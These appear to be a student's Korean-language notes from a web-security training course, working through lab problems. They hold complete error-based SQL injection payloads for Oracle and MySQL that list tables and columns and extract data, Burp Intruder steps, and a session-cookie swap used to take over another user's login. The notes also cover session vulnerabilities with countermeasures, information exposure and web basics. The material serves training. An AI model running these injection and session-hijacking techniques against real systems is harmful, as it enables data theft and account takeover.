* JSP, PHP 문제 8번


공격 구문 : ee%' and 1 = ORDSYS.ORD_DICOM.GETMAPPINGXPATH((__공격쿼리__), user, user) and '1%'='1

 ee%' and 1 = ORDSYS.ORD_DICOM.GETMAPPINGXPATH(((select 'hacker' from dual)), user, user) and '1%'='1

ee%' and 1=CTXSYS.DRITHSX.SN(user, (__공격쿼리__)) and '1%'='1

ee%' and 1=CTXSYS.DRITHSX.SN(user, (select 'hacker' from dual)) and '1%'='1

select 'hacker' from dual

1. 테이블
 select table_name from user_tables;
 1-1) 테이블의 개수 : 6개
    select count(table_name) from user_tables;
    ee%' and 1=CTXSYS.DRITHSX.SN(user, (select count(table_name) from user_tables)) and '1%'='1

 1-2) 테이블 1row 
    select table_name from (select table_name, rownum ln from user_tables) where ln = 1~6
ee%' and 1=CTXSYS.DRITHSX.SN(user, (select table_name from (select table_name, rownum ln from user_tables) where ln = 1)) and '1%'='1

   1 row : BOARD
   2 : COMM_FILE
   3 : COMM_MDI_FILE
   4 : MEMBER 
   5 : EQST_ANSWER   select * from eqst_Answer
   6 : ZIPCODE

2. 컬럼
 select column_name from user_tab_columns where table_name = 'EQST_ANSWER'
 2-1) 컬럼의 개수 : 5개
 ee%' and 1=CTXSYS.DRITHSX.SN(user, (select count(column_name) from user_tab_columns where table_name = 'EQST_ANSWER')) and '1%'='1
 select count(column_name) from user_tab_columns where table_name = 'EQST_ANSWER'

 2-2) 컬럼 1 row :
  select column_name from (select column_name, rownum as ln from user_tab_columns where table_name = 'EQST_ANSWER') where ln = 1

ee%' and 1=CTXSYS.DRITHSX.SN(user, (select column_name from (select column_name, rownum as ln from user_tab_columns where table_name = 'EQST_ANSWER') where ln = 1)) and '1%'='1

 1: ANSWER_COLUMN
 2: REG_DT
 3: REG_ACCT_ID
 4: UDT_DT
 5: UDT_ACCT_ID

3. 데이터
  select ANSWER_COLUMN from EQST_ANSWER

  1) 데이터의 개수 : 1개
  ee%' and 1=CTXSYS.DRITHSX.SN(user, (select count(answer_column) from eqst_answer)) and '1%'='1
  select count(answer_column) from eqst_answer

  2) 데이터 : skinfosec_eqst_lms_system
  ee%' and 1=CTXSYS.DRITHSX.SN(user, (select answer_column from eqst_answer)) and '1%'='1

  select answer_column from (select answer_column, rownum ln from eqst_answer) where ln = 1 ~ count (X)

  select answer_column from eqst_answer

ORA-000000
DRG-0000

MYSQL [0000]

- PHP 문제 8번

함수 : extractvalue(rand(), concat(0x3a, (__공격 쿼리) ))


select 컬럼1~..? from 게시판
where 제목 like '%___검색어___%'


공격구문 : DD%' and 1 = extractvalue(rand(), concat(0x3a, (__공격 쿼리) )) and '1%'='1

1. 테이블
1-1) 테이블의 개수 : 전체 70개, 사용자 7개
select table_name from information_schema.tables
-> 현재 사용하는 DB의 테이블만

select count(table_name) from information_schema.tables

select count(table_name) from information_schema.tables where table_schema = database();

DD%' and 1 = extractvalue(rand(), concat(0x3a, (select count(table_name) from information_schema.tables) )) and '1%'='1

1-2) 테이블 1 row  -> limit __어디부터__, __몇개__

DD%' and 1 = extractvalue(rand(), concat(0x3a, (select table_name from information_schema.tables limit 0, 1))) and '1%'='1
select table_name from information_schema.tables limit 0, 1
 
  1: access_log
  2: comm_file
  3: comm_mdi_file
  4: eqst_answer
  5: member
  6: notice
  7: zipcode

  
2. 컬럼
  select column_name from information_schema.columns where table_name = 'eqst_answer'
2-1) 컬럼의 개수 : 1개
  select count(column_name) from information_schema.columns where table_name = 'eqst_answer'

DD%' and 1 = extractvalue(rand(), concat(0x3a, (select count(column_name) from information_schema.columns where table_name = 'eqst_answer') )) and '1%'='1

2-2) 컬럼 : answer_column
select column_name from information_schema.columns where table_name = 'eqst_answer'

DD%' and 1 = extractvalue(rand(), concat(0x3a, (select column_name from information_schema.columns where table_name = 'eqst_answer') )) and '1%'='1

3. 데이터
select answer_column from eqst_answer

DD%' and 1 = extractvalue(rand(), concat(0x3a, (select answer_column from eqst_answer) )) and '1%'='1

* Burpsuite Intruder
1. 마우스 우클릭 -> Send to Intruder(Ctrl+I)
2. Intruder에서 값을 바꾸고 싶은 부분 Drag
3. 오른쪽에 ADD
4. Payloads 탭에서 Payload Type을 Numbers로
5. From, To, Step 설정 (어디부터 어디까지 얼마씩 더하면서)
6. 오른쪽 위에 Start attack
7. 하단의 Response 탭으로 이동
8. 왼쪽아래 톱니바퀴에서 Auto scroll 체크
9. 데이터를 보기위한 키워드 입력
10. 하단 방향키로 내리면서 데이터 확인

------------------------------------------
Blind SQL Injection 내일
-----------------------------------------

* Session / Cookie

HTTP의 특성
1 Request -> <- Response 웹서버 연결 X
2 요청에 대한 사용자의 정보를 저장 X

A /mail/list

B /mail/list

- 세션?
세션
세션ID
쿠키

naver.com 
                      Session : asdf
A ->            <-   [user : 비로그인   ] IP
                   Response
                   Set-Cookie:session=asdf
                <-
test01@naver.com ->    [user : test01@naver.com  
                         이름 : 홍길동             <- DB
                        최종 접속일 : 24/01/02 
                         IP : 64.245.221.32
                        ]
Cookie:session=asdf
                <- 
 
   

B ->            <_   Session : qwer
                     [user : 비로그인    ]
                    Response
                    Set-cookie:session=qwer
                             qwer
hacker@naver.com ->  [user : hacker@naver.com 
                      이름 : 김철수
                       최종..         
                       IP : 213.239.82.212   
                       PC HDD S/N : DF092fj2j ]           <-\

 

GET naver.com/mail/viewlist
Cookie:session=asdf

-> 쿠키(세션ID)를 탈취 그냥 그사람으로 서버에서는 인식
인증정보 -> 아이디+비밀번호


웹브라우저가
[naver.com 들어갈때는
session=qwer 달고 들어가기]
하드에 저장을 합니다.

삭제

네이버 - 같은 공유기 -  공유기 -- A 192.168.0.2
                              -- B 192.168.0.3
        223.12.39.14

공용IP

* 세션 관련 취약점 / 대응 방안

1. 세션 재사용 -> 인증정보 재사용
 - 공격자가 타인의 Cookie(SessionID)를 탈취하여 
   본인의 SessionID대신에 탈취한 SessionID를 사용해서 타인 권한 탈취(그 사람으로 로그인하는 거)
 - 최소한 대응 방안 : 접속자의 IP를 체크

2. 세션 고정
 - 로그인 전과 로그인 하고 나서 세션ID의 값이 같을 경우
 - 대응 방안 : 로그인 할 때 기존의 세션 공간을 삭제, 새로운 공간 만들어서 거기에 로그인
 
3. 세션 만료
 - 쿠키, 세션의 사용 기한이 정해져있지 않거나 아니면 너무 길때
 - Session Timeout 금융권, 중요한 관리자 
 - 세션 기간을 설정

 
홍길동 -> naver.com      <-        session: jkl                   
naver.com                        [ user : 비로그인    
                                   최종 접속일 : 24/06/13        ]        
                                    로그인한 사람이 직접 로그아웃하기 전까지 걍 냅둬
                                                                           
Cookie:   ffff               <- set-cookie:session=jkl                    fffff
                                    [ffff]
> hong@naver.com // password       
                                  session : llll <- 무차별대입, Brute-forcing 공격, 다른데서 탈취
                                   [ user : 홍길동
                                     id   : hong@naver.com ]
                             <- set-cookie:session=llll
                                

메일, 문자 피싱 -> 이 링크를 클릭
naver.com 로그인창
cookie: sessionid=kkkk -> 세션 주입공격


naver.com                 <-      session : kkkk
해커                            [ user : 비로그인 ]
cookie:sessionid=kkkk 
F5 새로고침
                
* 식별, 인증, 인가               -
취약점 X 식별 : 이 사람이 누구다 구분  
         아이디 
불충분한 이용자 인증 : 이 사람이 나야!
       비밀번호 <- 중요정보, 개인정보, 민감정보, 기밀정보
불충분한 이용자 인가 : 그래서 난 요런걸 할 수 있어 - 관리자 남의꺼 전체를 
       권한 - 권한탈취



로그인 전
PHPSESSID=bae823f2e1c6734fb2956cf7ca9e00df
PHPSESSID=bae823f2e1c6734fb2956cf7ca9e00df
PHPSESSID=bae823f2e1c6734fb2956cf7ca9e00df

e39d80bd014e4dd685aedb52a657d4e3
[    pppp@pppp.com           ]

로그인 후 
제꺼
PHPSESSID=e39d80bd014e4dd685aedb52a657d4e3
     
조강인님
PHPSESSID=1a91aca2c77a2ba3c955370450ec207e

* Match & Replace
e39 -> 1a91 항상 바꿔서 요청을 보내줘

GET /board/read?postindex=123&page=2

서버 
TCP 
A ----1 Server 끊어질떄
B ---/2
WebSocket


Web
A ----  Server X
B ----  Server X


* 세션 쿠키 문제 2번

1. 문제를 어떻게 풀었는지
  1) burp에서 뭐 확인했다
  2) 그래서 뭐뭐했다.
  3) 했더니 답이나왔다.

2. 정답

DM 으로 보내주시면 됩니다.

- Hint : Encoding

* 인코딩 유추 -> 디코딩
- Base64 : 영어 대,소문자, 특수문자 / + =
   yxLFmndlks/DLKFEzzDSf
- HTML Entity : &
   &#39;&#x09;&lt;&gt;&amp;
- URL : %
  alkfwmel%3dwlekfj%20lkjfd%sdfl

  개발자도구 : F12
               Ctrl + Shift + I


* 쿠키 변조

Cookie:JSESSIONID=lakdfaldjfej; 


* 세션 vs 쿠키 : 웹 통신이 상태를 저장하지 못하는 한계를 극복하기 위해 사용하는 것

세션 = 서버에 저장(서버의 메모리, 하드디스크, 저장공간)
쿠키 = 클라이언트(웹브라우저, 내 PC 하드디스크)에 저장(세션ID)

* Directory Indexing - 디렉토리 목록 노출

test.com/board/



* 디렉토리 목록 노출 문제 1번

1. 접근 경로 : 
   주소창 통으로 복사해서 붙여넣기
ex) http://elms1.skinfosec.co.kr:8156/p/insight/flag/flag.txt

2. 정답 : 

DM으로 보내주세요.

* 구글 해킹

* 정보 노출

해당 서버가 어떤 서버의 버전 몇을 사용하는지
소스코드 내의 주석 <- 개발 서버
기능은 있었는데 현재 화면에서만 안보이게하려고
임시 계정
백업파일

test.com/test/answer.php.bak
<? php
 echo 정답
?>

<!-- 취약한 기능 -->


Server: Apache/2.4.41 (Unix) OpenSSL/1.1.1d
X-Powered-By: PHP/7.0.33

* 정보 노출 문제 3번 

1. 정보를 어디서 어떻게 찾았는 지 :
2. 정답을 확인할 수 있는 URL : 
3. 정답 :

DM 보내주세요.

Hint 1 : 일단 로그인 하는 부분은 아니에요.
         로그인하고 나서 게시판 진입 이 후.
Hint 2 : 소스보기
Hint 3 : js 파일 X, 공지사항 목록 페이지에는 없음

-> 하신분들  문제 4번

Hint : 얘는 로그인하는 부분이에요.



* HTML     /    Javascript    / CSS
  화면틀   /  동적으로 실행   /  디자인


- HTML
tag
<___태그1__> 
    <___태그2___>
    text
    </___태그2___>
 </___1태그__>


- Javascript
2가지
html 안에서
<script src="test.js"></script>
    

test.js <- 파일
javascript 코드 
 

var a = 1;var b = 2;var c = a + b;console.log(c);alert(c);if(조건) {실행할거;}

a = 1 b = 2 c = a + c print(c)
if 조건:
    실행할거

- CSS
2가지

<style>
h1 {
    text-color: red;
}

</style>



def 함수명(인자):
    실행할거
    return

function 함수명(인자) {
    실행할거;
    return;
}

var 함수명 = function(인자, 인자2) {
    실행할거;
    return;
}

함수명(인자, 인자2);



Union SQL Injection 문제 풀이
Burpsuite Intruder 사용하는 방법
세션/쿠키
HTTP 특성 <- 한계 저장
이에 관련된 취약점 3개
세션 재사용, 세션 고정, 세션 만료 <-
식별, 인증, 인가
디렉토리 인덱싱 -> 구글해킹 -> OSINT
정보노출
HTML, Javascript, CSS 기본 골격, 문법 -> XSS, CSRF